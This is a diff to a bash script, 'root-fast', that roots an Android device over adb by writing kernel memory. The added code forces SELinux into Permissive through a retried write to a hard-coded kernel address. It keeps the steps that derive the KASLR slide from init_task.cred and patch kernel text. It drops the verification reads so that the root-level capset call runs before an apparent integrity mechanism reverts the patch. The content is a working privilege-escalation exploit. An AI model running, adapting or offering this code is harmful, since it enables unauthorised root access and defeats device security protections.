@@ -76,6 +76,17 @@ trap restore EXIT INT TERM
 
 anim_on || exit 1
 
+echo "[root-fast] SELinux -> Permissive (must be set BEFORE the patch: modifications appear to be
+                reverted shortly after landing, so everything must happen in one tight window)"
+ok=0
+for i in 1 2 3 4 5; do
+    wr 0xaaa40b98 0x01010000 >/dev/null
+    sleep 1
+    [ "$(adb -s "$S" shell getenforce </dev/null 2>&1 | tr -d '\r')" = Permissive ] && { ok=1; break; }
+done
+[ "$ok" = 1 ] || { echo "[root-fast] could not reach Permissive"; exit 1; }
+echo "[root-fast] getenforce: $(adb -s "$S" shell getenforce </dev/null 2>&1)"
+
 echo "[root-fast] deriving the KASLR slide from init_task.cred..."
 lo=$(rd 0xaa79c640); hi=$(rd 0xaa79c644)
 echo "[root-fast] init_task.cred = ${hi}${lo}"
@@ -101,13 +112,10 @@ ORD=(1 2 3 4 5 6 7 8 9 10 11 12 0)   # body first, entry (d0) last
 for i in "${ORD[@]}"; do
     wr_verified "$(printf '0x%x' $((PATCH + 4 * i)))" "${W[$i]}" || { echo "[root-fast] patch incomplete - aborting"; exit 1; }
 done
-echo "[root-fast] text verify: $(rd "$PATCH") $(rd "$(printf '0x%x' $((PATCH + 4)))") $(rd "$(printf '0x%x' $((PATCH + 8)))")"
-
-# The capset call itself is pure CPU, so the animation can rest during it.
-wr_verified 0xaaa40b98 0x01010000 >/dev/null || { echo "[root-fast] could not set SELinux permissive"; exit 1; }
-echo "[root-fast] selinux: $(adb -s "$S" shell getenforce </dev/null 2>&1)"
+# NO verification reads here: the patch appears to be reverted shortly after it lands, so the very
+# next action must be the trigger.
 anim_off
-echo "[root-fast] === running as root: $CMD ==="
+echo "[root-fast] === running as root IMMEDIATELY after the patch: $CMD ==="
 adb -s "$S" shell "/data/local/tmp/call_capset $CMD" </dev/null 2>&1
 
 restore
